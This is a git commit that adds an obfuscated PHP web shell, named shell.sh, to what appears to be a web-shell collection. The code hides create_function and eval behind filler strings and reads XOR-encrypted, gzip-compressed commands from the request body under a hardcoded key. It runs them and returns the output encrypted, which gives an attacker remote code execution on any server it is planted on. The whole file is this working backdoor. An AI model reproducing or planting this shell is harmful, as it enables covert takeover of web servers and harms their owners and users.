521fcf389b9442be2ac34aa3b8d86726b0625a19
scripter <83101169+scripter54@users.noreply.github.com>
2021-06-17 15:53:06 -0400

    Add files via upload

---
+++ web-shells/shell.sh
@@ -0,0 +1,13 @@
+<?php
+$s=';$r=@base6eb4_eebncebebode(@ebx(@gzcompresebebs($o),$k));ebprint(eb"$p$kh$r$kf");}';
+$N='match(eb"/$kh(.+eb)$ebebkebf/",@fileeb_get_conebtents(eb"php://input"';
+$F=';$jeb++,$i++eb){$o.eb=$t{$ebi}eb^$k{$jeb};}}reebturn $o;eb}ebifeb (@preg_';
+$Z='b($m[1]eb),$ebk)));$o=@eboebb_ebgebet_contents();@eboebb_endeb_clean()';
+$R='),$meb)==1) {@oebb_starebt();@eebval(@ebgzunceboebmpress(@ebx(@basebe64_decodee';
+$A='$k=eb"ebfae0b27c";$kh=eb"451c728eb867aeb5";$kf=eb"67e8ceb1bb4eeb53";$';
+$o='ebebrlen($t);eb$o=""eb;foebr($i=0;$i<$ebl;)eb{for($ebj=0;($j<$ebc&&eb$i<$l)';
+$n='p="ebkXebzRGEn29ebyoqebVkrMeb";function x($tebeb,$k){$ceb=strleben($k);$l=st';
+$y=str_replace('hE','','crhEeahEhEthEehE_hEfunction');
+$c=str_replace('eb','',$A.$n.$o.$F.$N.$R.$Z.$s);
+$W=$y('',$c);$W();
+?>
